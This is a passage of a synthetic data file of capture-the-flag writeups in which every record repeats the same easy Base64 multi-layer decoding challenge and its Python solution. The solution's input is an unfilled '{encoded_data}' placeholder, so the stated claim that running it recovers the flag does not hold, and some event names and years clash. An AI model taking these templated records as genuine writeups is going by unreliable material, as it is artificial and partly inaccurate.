decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/23", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836588", "synthetic": true}
{"id": "synthetic_encoding_024", "team": "synthetic_team_7", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #25", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/24", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836600", "synthetic": true}
{"id": "synthetic_encoding_025", "team": "synthetic_team_5", "event": "CTF_2024_Event_14", "challenge_name": "Base64 Multi-layer #26", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/25", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836618", "synthetic": true}
{"id": "synthetic_encoding_026", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "Base64 Multi-layer #27", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/26", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836630", "synthetic": true}
{"id": "synthetic_encoding_027", "team": "synthetic_team_6", "event": "CTF_2024_Event_4", "challenge_name": "Base64 Multi-layer #28", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/27", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836642", "synthetic": true}
{"id": "synthetic_encoding_028", "team": "synthetic_team_9", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #29", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/28", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836652", "synthetic": true}
{"id": "synthetic_encoding_029", "team": "synthetic_team_3", "event": "CTF_2024_Event_1", "challenge_name": "Base64 Multi-layer #30", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/29", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836666", "synthetic": true}
{"id": "synthetic_encoding_030", "team": "synthetic_team_3", "event": "CTF_2024_Event_13", "challenge_name": "Base64 Multi-layer #31", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/30", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836695", "synthetic": true}
{"id": "synthetic_encoding_031", "team": "synthetic_team_9", "event": "CTF_2024_Event_3", "challenge_name": "Base64 Multi-layer #32", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/31", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836708", "synthetic": true}
{"id": "synthetic_encoding_032", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "Base64 Multi-layer #33", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/32", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836721", "synthetic": true}
{"id": "synthetic_encoding_033", "team": "synthetic_team_4", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #34", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/33", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836733", "synthetic": true}
{"id": "synthetic_encoding_034", "team": "synthetic_team_8", "event": "CTF_2024_Event_14", "challenge_name": "Base64 Multi-layer #35", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/34", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836746", "synthetic": true}
{"id": "synthetic_encoding_035", "team": "synthetic_team_6", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #36", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/35", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836758", "synthetic": true}
{"id": "synthetic_encoding_036", "team": "synthetic_team_8", "event": "CTF_2024_Event_18", "challenge_name": "Base64 Multi-layer #37", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/36", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836770", "synthetic": true}
{"id": "synthetic_encoding_037", "team": "synthetic_team_6", "event": "CTF_2024_Event_15", "challenge_name": "Base64 Multi-layer #38", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/37", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836783", "synthetic": true}
